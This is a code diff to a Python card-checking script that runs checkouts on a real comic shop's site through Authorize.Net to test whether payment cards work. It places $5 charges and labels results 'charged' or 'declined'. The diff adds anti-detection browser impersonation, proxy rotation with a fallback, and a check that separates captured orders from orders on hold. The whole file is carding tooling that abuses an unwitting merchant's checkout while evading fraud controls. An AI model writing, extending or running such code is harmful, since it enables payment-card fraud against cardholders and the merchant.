@@ -9,6 +9,12 @@ import random
 import asyncio
 from bs4 import BeautifulSoup
 from curl_cffi.requests import AsyncSession
+try:
+    from anti_detect import get_browser_headers, create_anti_detect_session
+except ImportError:
+    import sys, os
+    sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")))
+    from anti_detect import get_browser_headers, create_anti_detect_session
 
 
 def _normalize_proxy_dict(proxy_str: str | None) -> dict | None:
@@ -49,27 +55,29 @@ async def check_card_authorize(
     cvc = str(cvc).strip()
 
     proxies = _normalize_proxy_dict(proxy_url)
-    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
+    profile_name = "chrome124"
+    browser_headers = get_browser_headers(profile_name)
 
     # Attempt with proxy if provided, then fallback to direct if proxy hangs/fails
     proxy_attempts = [proxies, None] if proxies else [None]
 
     for current_proxies in proxy_attempts:
         try:
-            async with AsyncSession(impersonate="chrome120", timeout=30) as session:
+            proxy_arg = current_proxies.get("http") if current_proxies else None
+            async with create_anti_detect_session(profile_name=profile_name, proxy=proxy_arg, timeout=30) as session:
                 # Step 1: Add item to cart via direct GET param
                 r_add = await session.get(
                     "https://backpackcomics.com/product/large-3-inch-character-buttons-2/?add-to-cart=11077",
-                    headers={"User-Agent": user_agent},
+                    headers=browser_headers,
                     proxies=current_proxies
                 )
 
                 # Step 2: Fetch Checkout page to extract nonce
                 headers_checkout = {
+                    **browser_headers,
                     "authority": "backpackcomics.com",
                     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                     "referer": "https://backpackcomics.com/product/large-3-inch-character-buttons-2/",
-                    "user-agent": user_agent,
                 }
                 r_checkout = await session.get(
                     "https://backpackcomics.com/checkout/",
@@ -108,12 +116,12 @@ async def check_card_authorize(
 
                 # Step 3: Submit Checkout directly
                 headers_final = {
+                    **browser_headers,
                     "authority": "backpackcomics.com",
                     "accept": "application/json, text/javascript, */*; q=0.01",
                     "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "origin": "https://backpackcomics.com",
                     "referer": "https://backpackcomics.com/checkout/",
-                    "user-agent": user_agent,
                     "x-requested-with": "XMLHttpRequest",
                 }
                 first_name = "Marco"
@@ -182,6 +190,23 @@ async def check_card_authorize(
                         return "declined", response_text or "Card Declined", "Authorize.Net"
 
                 if result and result != "failure":
+                    redirect_url = api_response.get("redirect", "")
+                    order_id = api_response.get("order_id", "")
+                    
+                    # Verify capture on backend
+                    is_on_hold = False
+                    if order_id:
+                        pay_url = f"https://backpackcomics.com/checkout/order-pay/{order_id}/?pay_for_order=true"
+                        try:
+                            r_pay = await session.get(pay_url, headers=browser_headers, timeout=10)
+                            if "status is" in r_pay.text and "on hold" in r_pay.text.lower():
+                                is_on_hold = True
+                        except Exception:
+                            pass
+                    
+                    if is_on_hold:
+                        return "declined", "Uncaptured (Order On Hold)", "Authorize.Net"
+
                     return "charged", "Charged! ✅ -» $5.00", "Authorize.Net"
 
                 return "declined", "Card Declined", "Authorize.Net"
